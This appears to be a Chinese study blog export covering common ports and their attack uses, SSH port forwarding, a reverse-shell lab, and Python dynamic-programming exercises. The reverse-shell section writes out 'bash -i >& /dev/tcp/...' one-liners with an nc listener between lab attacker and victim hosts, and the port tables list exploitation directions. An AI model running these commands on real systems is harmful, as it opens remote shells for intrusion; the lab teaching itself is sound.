<p>端口说明：<strong>109端口是为POP2（Post Office Protocol Version  2，邮局协议2）服务开放的，110端口是为POP3（邮件协议3）服务开放的，POP2、POP3都是主要用于接收邮件的，目前POP3使用的比较多</strong>，许多服务器都同时支持POP2和POP3。客户端可以使用POP3协议来访问服务端的邮件服务，如今ISP的绝大多数邮件服务器都是使用该协议。在使用电子邮件客户端程序的时候，会要求输入POP3服务器地址，默认情况下使用的就是110端口。</p>
<p>端口漏洞：POP2、POP3在提供邮件接收服务的同时，也出现了不少的漏洞。单单POP3服务在用户名和密码交换缓冲区溢出的漏洞就不少于20个，比如WebEasyMail POP3 Server合法用户名信息泄露漏洞，通过该漏洞远程攻击者可以验证用户账户的存在。另外，110端口也被ProMail  trojan等木马程序所利用，通过110端口可以窃取POP账号用户名和密码。</p>
<p>操作建议：如果是执行邮件服务器，可以打开该端口</p>
<h3 id="网络协议端口"><a href="#网络协议端口" class="headerlink" title="网络协议端口"></a><strong>网络协议端口</strong></h3><table>
<thead>
<tr>
<th>端口号</th>
<th>端口说明</th>
<th>利用方向</th>
</tr>
</thead>
<tbody><tr>
<td><strong>53</strong></td>
<td><strong>DNS域名系统</strong></td>
<td><strong>允许区域传送、DNS劫持、缓存投毒、欺骗</strong></td>
</tr>
<tr>
<td><strong>67/68</strong></td>
<td><strong>DHCP服务</strong></td>
<td><strong>劫持、欺骗</strong></td>
</tr>
<tr>
<td><strong>161</strong></td>
<td><strong>SNMP协议</strong></td>
<td><strong>爆破、搜集目标内网信息</strong></td>
</tr>
</tbody></table>
<h3 id="特殊服务端口"><a href="#特殊服务端口" class="headerlink" title="特殊服务端口"></a><strong>特殊服务端口</strong></h3><table>
<thead>
<tr>
<th>端口号</th>
<th>端口说明</th>
<th>利用方向</th>
</tr>
</thead>
<tbody><tr>
<td><strong>2128</strong></td>
<td><strong>Zookeeper 服务</strong></td>
<td><strong>未授权访问</strong></td>
</tr>
<tr>
<td><strong>8068</strong></td>
<td><strong>Zabbix 服务</strong></td>
<td><strong>远程执行、SQL注入</strong></td>
</tr>
<tr>
<td><strong>9200/9300</strong></td>
<td><strong>Elasticsearch 服务</strong></td>
<td><strong>远程执行</strong></td>
</tr>
<tr>
<td><strong>11211</strong></td>
<td><strong>Memcache 服务</strong></td>
<td><strong>未授权访问</strong></td>
</tr>
<tr>
<td><strong>512/513/514</strong></td>
<td><strong>Linux Rexec 服务</strong></td>
<td><strong>爆破、Rlogin登陆</strong></td>
</tr>
<tr>
<td><strong>873</strong></td>
<td><strong>Rsync 服务</strong></td>
<td><strong>匿名访问、文件上传</strong></td>
</tr>
<tr>
<td><strong>3690</strong></td>
<td><strong>Svn 服务</strong></td>
<td><strong>Svn泄露、未授权访问</strong></td>
</tr>
<tr>
<td><strong>50000</strong></td>
<td><strong>SAP Management Console</strong></td>
<td><strong>远程执行</strong></td>
</tr>
</tbody></table>
<h3 id="端口概念"><a href="#端口概念" class="headerlink" title="端口概念"></a><strong>端口概念</strong></h3><p>在网络技术中，端口（Port）大致有两种意思：一是物理意义上的端口，比如，ADSL  Modem、集线器、交换机、路由器用于连接其他网络设备的接口，如RJ-45端口、SC端口等等。二是逻辑意义上的端口，一般是指TCP/IP协议中的端口，端口号的范围从0到65535，比如用于浏览网页服务的80端口，用于FTP服务的21端口等等。我们这里将要介绍的就是逻辑意义上的端口。</p>
<h3 id="端口分类"><a href="#端口分类" class="headerlink" title="端口分类"></a><strong>端口分类</strong></h3><p>逻辑意义上的端口有多种分类标准，下面将介绍两种常见的分类：</p>
<p><strong>1、按端口号分布划分</strong></p>
<p>（1）知名端口（Well-Known Ports）</p>
<p><strong>知名端口即众所周知的端口号，范围从0到1023</strong>，这些端口号一般固定分配给一些服务。比如21端口分配给FTP服务，25端口分配给SMTP（简单邮件传输协议）服务，80端口分配给HTTP服务，135端口分配给RPC（远程过程调用）服务等等。</p>
<p>（2）动态端口（Dynamic Ports）</p>
<p>　　<strong>动态端口的范围从1024到65535</strong>，这些端口号一般不固定分配给某个服务，也就是说许多服务都可以使用这些端口。只要运行的程序向系统提出访问网络的申请，那么系统就可以从这些端口号中分配一个供该程序使用。比如1024端口就是分配给第一个向系统发出申请的程序。在关闭程序进程后，就会释放所占用的端口号。</p>
<p>　不过，动态端口也常常被病毒木马程序所利用，如冰河默认连接端口是7626、WAY 2.4是8011、Netspy 3.0是7306、YAI病毒是1024等等。</p>
<p><strong>2、按协议类型划分</strong></p>
<p>按协议类型划分，可以分为TCP、UDP、IP和ICMP（Internet控制消息协议）等端口。下面主要介绍TCP和UDP端口：</p>
<p>（1）TCP端口</p>
<p>TCP端口，即传输控制协议端口，需要在客户端和服务器之间建立连接，这样可以提供可靠的数据传输。常见的包括FTP服务的21端口，Telnet服务的23端口，SMTP服务的25端口，以及HTTP服务的80端口等等。</p>
<p>（2）UDP端口</p>
<p>UDP端口，即用户数据包协议端口，无需在客户端和服务器之间建立连接，安全性得不到保障。<strong>常见的有DNS服务的53端口，SNMP（简单网络管理协议）服务的161端口</strong>，QQ使用的8000和4000端口等等。</p>
<h3 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a><strong>查看端口</strong></h3><p>在Windows 2000/XP/Server 2003中要查看端口，可以使用Netstat命令：</p>
<p>依次点击“开始→运行”，键入“cmd”并回车，打开命令提示符窗口。在命令提示符状态下键入“netstat -a -n”，按下回车键后就可以看到以数字形式显示的TCP和UDP连接的端口号及状态（如图）。</p>
<p>小知识：Netstat命令用法</p>
<p>命令格式：Netstat －a －e －n －o －s</p>
<p><strong>一般用 netstat -ano 来查看使用中的端口</strong></p>
<p>　　－a 表示显示所有活动的TCP连接以及计算机监听的TCP和UDP端口。</p>
<p>　　－e 表示显示以太网发送和接收的字节数、数据包数等。</p>
<p>　　－n 表示只以数字形式显示所有活动的TCP连接的地址和端口号。</p>
<p>　　－o 表示显示活动的TCP连接并包括每个连接的进程ID（PID）。</p>
<p>　　－s 表示按协议显示各种连接的统计信息，包括端口号</p>
<hr>
<p>参考：<a href="https://www.cnblogs.com/zane-s/p/12435873.html" target="_blank" rel="noopener">https://www.cnblogs.com/zane-s/p/12435873.html</a></p>
]]></content>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title>web杂烩</title>
    <url>/2020/04/12/web%E6%9D%82%E7%83%A9/</url>
    <content><![CDATA[<p>以下工具或命令不能实现端口转发是（）</p>
<p>端口转发（Port forwarding）是安全壳(SSH)  为网络安全通信使用的一种方法。SSH可以利用端口转发技术来传输其他TCP/IP协议的报文，当使用这种方式时，SSH就为其他服务在客户端和服务器端建立了一条安全的传输管道。端口转发利用本客户机端口映射到服务器端口来工作，SSH可以映射所有的服务器端口到本地端口，但要设置1024以下的端口需要根用户权限。在使用防火墙的网络中，如果设置为允许SSH服务通过(开启了22端口)，而阻断了其他服务，则被阻断的服务仍然可以通过端口转发技术转发数据包</p>
<p>ssh可以实现本地端口转发,远程端口转发,动态端口转发。  <a href="https://www.cnblogs.com/keerya/articles/7612715.html" target="_blank" rel="noopener">https://www.cnblogs.com/keerya/articles/7612715.html</a>     netsh端口转发:  <a href="https://www.jianshu.com/p/3b108844729e" target="_blank" rel="noopener">https://www.jianshu.com/p/3b108844729e</a>  </p>
<p>htran端口转发:  <a href="https://cloud.tencent.com/developer/article/1365274" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1365274</a>   </p>
<p>MSBuild: MSBuild 是 Microsoft 和 Visual Studio的生成系统。可以用来绕过AppLocker  <a href="https://mp.weixin.qq.com/s?__biz=MzI0MDY1MDU4MQ==&amp;amp;amp;amp;idx=3&amp;amp;amp;amp;mid=2247485170&amp;amp;amp;amp;sn=aaeff82030075ceefa342a86664395a5" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI0MDY1MDU4MQ==&amp;amp;amp;amp;idx=3&amp;amp;amp;amp;mid=2247485170&amp;amp;amp;amp;sn=aaeff82030075ceefa342a86664395a5</a>   </p>
<p>更多端口转发工具  <a href="http://blog.sina.cn/dpool/blog/s/blog_777f9dbb0101008r.html?vt=4" target="_blank" rel="noopener">http://blog.sina.cn/dpool/blog/s/blog_777f9dbb0101008r.html?vt=4</a>   <a href="https://www.freebuf.com/articles/web/170970.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/170970.html</a></p>
<hr>
<p>php://phar是用来读取phar文件的 phar文件在使用特定的函数时会触发反序列化漏洞具体利用方法 <a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p>
<h2 id="反弹shell原理与实现"><a href="#反弹shell原理与实现" class="headerlink" title="反弹shell原理与实现"></a><a href="https://www.cnblogs.com/iouwenbo/p/11277453.html" target="_blank" rel="noopener">反弹shell原理与实现</a></h2><p><strong>什么是反弹shell？</strong></p>
<p>　　反弹shell（reverse  shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse  shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
<p><strong>为什么要反弹shell？</strong></p>
<p>通常用于被控端因防火墙受限、权限不足、端口被占用等情形。</p>
<p>举例：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。那么什么情况下正向连接不能用了呢？</p>
<p>有如下情况：</p>
<p>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。 </p>
<p>2.目标机器的ip动态改变，你不能持续控制。</p>
<p>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
<p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。</p>
<p>那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>
<p>==============================================================</p>
<p><strong>反弹shell实验</strong></p>
<p>环境：两台CentOS7.6服务器</p>
<ul>
<li>攻击端 hacker：10.201.61.194 </li>
<li>受害端 victim：10.201.61.195 </li>
</ul>
<p>\1. 攻击端监听一个端口：</p>
<p>[root@hacker ~]# <strong>nc -lvp 6767</strong></p>
<p><em>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )</em></p>
<p><em>Ncat: Listening on :::6767</em></p>
<p><em>Ncat: Listening on 0.0.0.0:6767</em></p>
<p>2.受害端生成一个反弹shell：</p>
<p>[root@victim ~]# <strong>bash -i &gt;&amp; /dev/tcp/10.201.61.194/6767 0&gt;&amp;1</strong></p>
<p>3.攻击端已获取到受害端的bash：</p>
<p>[root@hacker ~]# nc -lvp 6767</p>
<p><em>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )</em></p>
<p><em>Ncat: Listening on :::6767</em></p>
<p><em>Ncat: Listening on 0.0.0.0:6767</em></p>
<p><em>Ncat: Connection from 10.201.61.195.</em></p>
<p><em>Ncat: Connection from 10.201.61.195:46836.</em></p>
<p>[root@victim ~]#     //攻击端已获得受害端的远程交互式shell</p>
<p>[root@victim ~]# hostname</p>
<p>hostname</p>
<p>victim</p>
<p><strong>解释：</strong></p>
<p>\1. nc -lvp 6767</p>
<p> -l 监听，-v 输出交互或出错信息，-p 端口。nc是netcat的简写，可实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口。</p>
<p>\2. bash -i</p>
<p>-i interactive。即产生一个交互式的shell（bash）。</p>
<p>\3. /dev/tcp/IP/PORT </p>
<p>特殊设备文件（Linux一切皆文件），实际这个文件是不存在的，它只是 <code>bash</code> 实现的用来实现网络请求的一个接口。打开这个文件就相当于发出了一个socket调用并建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。</p>
<p><strong>通过以下4个小测试来分析反弹shell实现过程：</strong></p>
<p>（PS: 注意执行步骤顺序）</p>
<p><strong>测试1：</strong></p>
<p>受害端：</p>
<p>[root@victim ~]# bash -i &gt; /dev/tcp/10.201.61.194/5566    //第二步<br>[root@victim ~]# hostname    //第三步<br>[root@victim ~]# </p>
<p>攻击端：</p>
<p>[root@hacker ~]# nc -lvp 5566   //第一步</p>
<p>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )<br>Ncat: Listening on :::5566<br>Ncat: Listening on 0.0.0.0:5566<br>Ncat: Connection from 10.201.61.195.<br>Ncat: Connection from 10.201.61.195:49018.</p>
<p>victim   //测试1结果：实现了将受害端的标准输出重定向到攻击端，但是还没实现用命令控制受害端。</p>
<p><strong>测试2：</strong></p>
<p>受害端：</p>
<p>[root@victim ~]# bash -i &lt; /dev/tcp/10.201.61.194/5566    //第二步<br>[root@victim ~]# hostname    //测试2结果：实现了将攻击端的输入重定向到受害端，但是攻击端看不到命令执行结果。<br>victim</p>
<p> 攻击端：</p>
<p>[root@hacker ~]# nc -lvp 5566    //第一步<br>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )<br>Ncat: Listening on :::5566<br>Ncat: Listening on 0.0.0.0:5566<br>Ncat: Connection from 10.201.61.195.<br>Ncat: Connection from 10.201.61.195:50412.<br>hostname    //第三步（攻击端执行命令）</p>
<p><strong>测试3</strong>：</p>
<p>受害端：</p>
<p>[root@victim ~]# bash -i &gt; /dev/tcp/10.201.61.194/5566 0&gt;&amp;1    //第二步<br>[root@victim ~]# hostname    //受害端回显命令<br>[root@victim ~]# id    //受害端回显命令<br>[root@victim ~]# hahaha    //受害端回显命令<br>bash: hahaha: command not found    //受害端回显命令。显示错误命令的输出。<br>[root@victim ~]# </p>
<p> 攻击端：</p>
<p>[root@hacker ~]# nc -lvp 5566    //第一步<br>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )<br>Ncat: Listening on :::5566<br>Ncat: Listening on 0.0.0.0:5566<br>Ncat: Connection from 10.201.61.195.<br>Ncat: Connection from 10.201.61.195:36792.<br>hostname    //第三步（攻击端执行命令）<br>victim<br>id    //第四步（攻击端执行命令）<br>uid=0(root) gid=0(root) groups=0(root)<br>hahaha    //第五步（执行一个错误的命令）</p>
<p>//测试3结果：基本实现了反弹shell的功能。但是受害端的机器上依然回显了攻击者机器上执行的命令，且攻击端看不到错误命令的输出。</p>
<p> <strong>测试4</strong>（将上面三个测试结合。将标准输入、标准输出、错误输出全都重定向到攻击端）： </p>
<p>受害端：</p>
<p>[root@victim ~]# bash -i &gt; /dev/tcp/10.201.61.194/5566 0&gt;&amp;1 2&gt;&amp;1    //第二步。或 # bash -i &amp;&gt; /dev/tcp/10.201.61.194/5566 0&gt;&amp;1 （注：&amp;&gt;或&gt;&amp; 表示混合输出，即标准输出1 + 错误输出2）</p>
<p>攻击端：</p>
<p>[root@hacker <del>]# nc -lvp 5566    //第一步<br>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )<br>Ncat: Listening on :::5566<br>Ncat: Listening on 0.0.0.0:5566<br>Ncat: Connection from 10.201.61.195.<br>Ncat: Connection from 10.201.61.195:51182.<br>[root@victim ~]# hostname    //第三步。测试4结果：攻击端已获得受害端的远程交互式shell，而且受害端没有再回显攻击端输入的命令</del><br>hostname<br>victim</p>
<p>//PS：由测试3、测试4对比可见，标准错误2不仅显示错误信息的作用，居然还有回显输入命令和终端提示符的作用<del>~</del></p>
<h2 id="排查本机网络问题："><a href="#排查本机网络问题：" class="headerlink" title="排查本机网络问题："></a><strong>排查本机网络问题：</strong></h2><table>
<thead>
<tr>
<th><strong>1</strong></th>
<th><strong>ping 127.0.0.1</strong></th>
<th><strong>排查本机 TCP/IP 协议是否正常</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>2</strong></td>
<td><strong>ping 本机IP</strong></td>
<td><strong>排查网卡或网卡驱动是否正常</strong></td>
</tr>
<tr>
<td><strong>3</strong></td>
<td><strong>ping 同网段IP</strong></td>
<td><strong>排查交换机端口工作模式、vlan划分</strong></td>
</tr>
<tr>
<td><strong>4</strong></td>
<td><strong>ping 通网段网关</strong></td>
<td><strong>排查主机到本地网络是否正常</strong></td>
</tr>
<tr>
<td><strong>5</strong></td>
<td><strong>ping 公网IP</strong></td>
<td><strong>排查路由是否正常</strong></td>
</tr>
<tr>
<td><strong>6</strong></td>
<td><strong>ping 公网某个域名</strong></td>
<td><strong>排查DNS服务配置是否正常</strong></td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title>python编程</title>
    <url>/2020/04/06/python%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="动态规划⭐"><a href="#动态规划⭐" class="headerlink" title="动态规划⭐"></a><strong>动态规划⭐</strong></h2><p>众所周知，牛妹有很多很多粉丝，粉丝送了很多很多礼物给牛妹，牛妹的礼物摆满了地板。  地板是N×MN\times MN×M的格子，每个格子有且只有一个礼物，牛妹已知每个礼物的体积。 地板的坐标是左上角(1,1) 右下角（N, M）。 牛妹只想要从屋子左上角走到右下角，每次走一步，每步只能向下走一步或者向右走一步或者向右下走一步，每次走过一个格子，拿起（并且必须拿上）这个格子上的礼物。牛妹想知道，她能走到最后拿起的所有礼物体积最小和是多少？ </p>
<p><strong>真的是非常简单的动态规划了，好久没敲代码了，虽然简单，但是也要熟悉呀，略菜备注较多哈~</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">selectPresent</span><span class="params">(self ,presentVolumn)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> presentVolumn:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        N=len(presentVolumn)<span class="comment">#行数</span></span><br><span class="line">        M=len(presentVolumn[<span class="number">0</span>])<span class="comment">#列数</span></span><br><span class="line">        dp=[[<span class="number">0</span>]*M <span class="keyword">for</span> _ <span class="keyword">in</span> range(N)]  <span class="comment">#for _ in range(x) _表示占位符，功能只是用于循环</span></span><br><span class="line">        print(dp)  <span class="comment">#dp用于表示走到该格子，当前的总价值</span></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>]=presentVolumn[<span class="number">0</span>][<span class="number">0</span>] <span class="comment">#初始化1x1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,N):</span><br><span class="line">            dp[i][<span class="number">0</span>]=dp[i<span class="number">-1</span>][<span class="number">0</span>]+presentVolumn[i][<span class="number">0</span>] <span class="comment">#初始化价值</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,M):</span><br><span class="line">            dp[<span class="number">0</span>][i]=dp[<span class="number">0</span>][i<span class="number">-1</span>]+presentVolumn[<span class="number">0</span>][i] <span class="comment">#初始化</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,N):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,M):</span><br><span class="line">                dp[i][j]=min(dp[i<span class="number">-1</span>][j<span class="number">-1</span>],dp[i<span class="number">-1</span>][j],dp[i][j<span class="number">-1</span>])+presentVolumn[i][j] <span class="comment">#更新总价值，看左上角、左边、上边的最小值，进行更新</span></span><br><span class="line">        <span class="keyword">return</span> dp[i][j]</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    n = int(input()) <span class="comment">#// 输入二维数组的行数</span></span><br><span class="line">    line = [[<span class="number">0</span>] * n] * n <span class="comment">#// 初始化二维数组</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        line[i] = input().split(<span class="string">" "</span>) <span class="comment">#输入二维数组，同行数字用空格分隔，不同行则用回车换行</span></span><br><span class="line">        line[i] = [int(j) <span class="keyword">for</span> j <span class="keyword">in</span> line[i]]<span class="comment"># // 将数组中的每一行转换成整型</span></span><br><span class="line">    print(line) <span class="comment">#// 打印二维数组1</span></span><br><span class="line">    print(Solution().selectPresent(line))</span><br></pre></td></tr></table></figure>

<h2 id="动态规划⭐⭐—最长公共子序列"><a href="#动态规划⭐⭐—最长公共子序列" class="headerlink" title="动态规划⭐⭐—最长公共子序列"></a><strong>动态规划⭐⭐—最长公共子序列</strong></h2><p>  众所周知，牛妹是一个offer收割姬，这次面试她遇到了这样的一个问题。 </p>
<p>  给了一个序列，让找出最长的“凸子序列” </p>
<p>  何为“凸子序列”：数列中有一个xi,使得所有x0&lt;x1&lt;x2….xi-1&lt;xi且xi&gt;xi+1&gt;xi+1&gt;….&gt;xn  </p>
<p>  eg：12345431,是山峰序列，12345234不是山峰序列 </p>
<p>  注：单调递增或单调递减序列也算山峰序列；单独一个数是长度为1的山峰序列</p>
<p><strong>纠结了很久，还是没好好审题，要的是从第一个元素开始就递增的，这样只需要判断后面的元素是否比它大就行</strong></p>
<p><strong>然后从右侧反向递增，同前面一样，找比最后一个元素大的，然后对两者进行相加，减去公共的，即可求解</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mountainSequence</span><span class="params">(self, numberList )</span>:</span></span><br><span class="line">        <span class="comment"># write code here</span></span><br><span class="line">        n = len(numberList)</span><br><span class="line">        <span class="keyword">if</span> n==<span class="number">1</span> :<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        up=[<span class="number">1</span>]*n</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n): <span class="comment">#正向递增</span></span><br><span class="line">            print(<span class="string">"------"</span>)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(i):</span><br><span class="line">                <span class="keyword">if</span> numberList[i]&gt;numberList[j] <span class="keyword">and</span> up[i]&lt;up[j]+<span class="number">1</span>: <span class="comment">#正推</span></span><br><span class="line">                    up[i]=up[j]+<span class="number">1</span></span><br><span class="line">        down=[<span class="number">1</span>]*n</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>): <span class="comment">#反向递增 (10,-1,-1) ,注意这是是n-1</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(n<span class="number">-1</span>,i,<span class="number">-1</span>): <span class="comment">#(10,10.9.8..0,-1)</span></span><br><span class="line">                <span class="keyword">if</span> numberList[j]&lt;numberList[i] <span class="keyword">and</span> down[i]&lt;down[j]+<span class="number">1</span>:</span><br><span class="line">                    down[i]=down[j]+<span class="number">1</span></span><br><span class="line">        res=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">            res=max(res,down[i]+up[i]<span class="number">-1</span>) <span class="comment">#交叉点重复了</span></span><br><span class="line">            print(res)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>

<h2 id="动态规划⭐⭐—0-1背包问题"><a href="#动态规划⭐⭐—0-1背包问题" class="headerlink" title="动态规划⭐⭐—0-1背包问题"></a><strong>动态规划⭐⭐—0-1背包问题</strong></h2><p>众所周知，牛能和牛可乐经常收到小粉丝们送来的礼物，每个礼物有特定的价值，他俩想要尽可能按照自己所得价值来平均分配所有礼物。那么问题来了，在最优的情况下，他俩手中得到的礼物价值和的最小差值是多少呢？ </p>
<p>p.s 礼物都很珍贵，所以不可以拆开算哦 </p>
<p><strong>这题的本质就是0-1背包问题，只要将总价值向上取一半作为背包容量，尽可能的装满这个背包，则所求差值最小</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">maxPresent</span><span class="params">(presentVec)</span>:</span></span><br><span class="line">    volumn = sum(presentVec)</span><br><span class="line">    one_person = (volumn+<span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">    dp = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(one_person + <span class="number">1</span>)] <span class="comment">#背包容量</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(presentVec)): <span class="comment">#物品数量</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(one_person, presentVec[i] - <span class="number">1</span>, <span class="number">-1</span>): <span class="comment">#range(start, stop, step)  (背包容量,物体体积，倒过来)</span></span><br><span class="line">            <span class="keyword">if</span> dp[j - presentVec[i]] + presentVec[i] &gt; dp[j]: <span class="comment">#判断是否最优，更新背包</span></span><br><span class="line">                dp[j] = dp[j - presentVec[i]] + presentVec[i]</span><br><span class="line">                <span class="comment">#print(dp[j])</span></span><br><span class="line">    maxvalue = dp[one_person]</span><br><span class="line">    <span class="keyword">return</span> abs(maxvalue - (volumn - maxvalue))</span><br></pre></td></tr></table></figure>









<hr>
<h2 id="python3-语法随笔小记"><a href="#python3-语法随笔小记" class="headerlink" title="python3 语法随笔小记"></a><strong>python3 语法随笔小记</strong></h2><h4 id="data-b’’-join-buffer-如何理解？"><a href="#data-b’’-join-buffer-如何理解？" class="headerlink" title="data=b’’.join(buffer)如何理解？"></a><strong>data=b’’.join(buffer)如何理解？</strong></h4><p>b’’是一个空字节，join是连接列表的函数，buffer是一个字节串的列表<br>连起来的意思就是使用空字节把buffer这个字节列表连接在一起，成为一个新的字节串<br>这个是python3新的地方，以前join只能连接字符串，现在可以连接字节串<br>功能就是把[b’ab’,b’cd’,b’ef’]变成 b’abcdef’ </p>
<h4 id="time-sleep-t"><a href="#time-sleep-t" class="headerlink" title="time.sleep(t)"></a><strong>time.sleep(t)</strong></h4><p>需要加 import time</p>
<h4 id="socket-函数"><a href="#socket-函数" class="headerlink" title="socket()函数"></a><strong>socket()函数</strong></h4><p>服务器端套接字</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s.bind()<span class="comment">#绑定地址（host,port）到套接字， 在AF_INET下,以元组（host,port）的形式表示地址。</span></span><br><span class="line">s.listen()<span class="comment">#开始TCP监听。backlog指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为1，大部分应用程序设为5就可以了。</span></span><br><span class="line">s.accept()<span class="comment">#被动接受TCP客户端连接,(阻塞式)等待连接的到来</span></span><br></pre></td></tr></table></figure>

<p>客户端套接字</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s.connect()<span class="comment">#主动初始化TCP服务器连接，。一般address的格式为元组（hostname,port），如果连接出错，返回socket.error错误。</span></span><br><span class="line">s.connect_ex()<span class="comment">#connect()函数的扩展版本,出错时返回出错码,而不是抛出异常</span></span><br></pre></td></tr></table></figure>

<p>公共用途的套接字函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s.recv()<span class="comment">#接收TCP数据，数据以字符串形式返回，bufsize指定要接收的最大数据量。flag提供有关消息的其他信息，通常可以忽略。</span></span><br><span class="line">s.send()<span class="comment">#发送TCP数据，将string中的数据发送到连接的套接字。返回值是要发送的字节数量，该数量可能小于string的字节大小。</span></span><br><span class="line">s.sendall()<span class="comment">#完整发送TCP数据，完整发送TCP数据。将string中的数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回None，失败则抛出异常。</span></span><br><span class="line">s.recvfrom()<span class="comment">#接收UDP数据，与recv()类似，但返回值是（data,address）。其中data是包含接收数据的字符串，address是发送数据的套接字地址。</span></span><br><span class="line">s.sendto()<span class="comment">#发送UDP数据，将数据发送到套接字，address是形式为（ipaddr，port）的元组，指定远程地址。返回值是发送的字节数。</span></span><br><span class="line">s.close()<span class="comment">#关闭套接字</span></span><br><span class="line">s.getpeername()<span class="comment">#返回连接套接字的远程地址。返回值通常是元组（ipaddr,port）。</span></span><br><span class="line">s.getsockname()<span class="comment">#返回套接字自己的地址。通常是一个元组(ipaddr,port)</span></span><br><span class="line">s.setsockopt(level,optname,value)<span class="comment">#设置给定套接字选项的值。</span></span><br><span class="line">s.getsockopt(level,optname[.buflen])<span class="comment">#返回套接字选项的值。</span></span><br><span class="line">s.settimeout(timeout)<span class="comment">#设置套接字操作的超时期，timeout是一个浮点数，单位是秒。值为None表示没有超时期。一般，超时期应该在刚创建套接字时设置，因为它们可能用于连接的操作（如connect()）</span></span><br><span class="line">s.gettimeout()<span class="comment">#返回当前超时期的值，单位是秒，如果没有设置超时期，则返回None。</span></span><br><span class="line">s.fileno()<span class="comment">#返回套接字的文件描述符。</span></span><br><span class="line">s.setblocking(flag)<span class="comment">#如果flag为0，则将套接字设为非阻塞模式，否则将套接字设为阻塞模式（默认值）。非阻塞模式下，如果调用recv()没有发现任何数据，或send()调用无法立即发送数据，那么将引起socket.error异常。</span></span><br><span class="line">s.makefile()<span class="comment">#创建一个与该套接字相关连的文件</span></span><br></pre></td></tr></table></figure>

<p><strong>accept方法会返回一个含有两个元素的元组，（fd,addr）。</strong></p>
<p><strong>第一个元素是新的socket对象，服务器通过它与客户端通信。第二个元素是客户端的地址及端口信息。</strong></p>
<h4 id="格式化输出-s-d-等"><a href="#格式化输出-s-d-等" class="headerlink" title="格式化输出 %s %d 等"></a><strong>格式化输出 %s %d 等</strong></h4><table>
<thead>
<tr>
<th>%%</th>
<th>百分号标记</th>
</tr>
</thead>
<tbody><tr>
<td>%c</td>
<td>字符及其ASCII码</td>
</tr>
<tr>
<td><strong>%s</strong></td>
<td><strong>字符串</strong></td>
</tr>
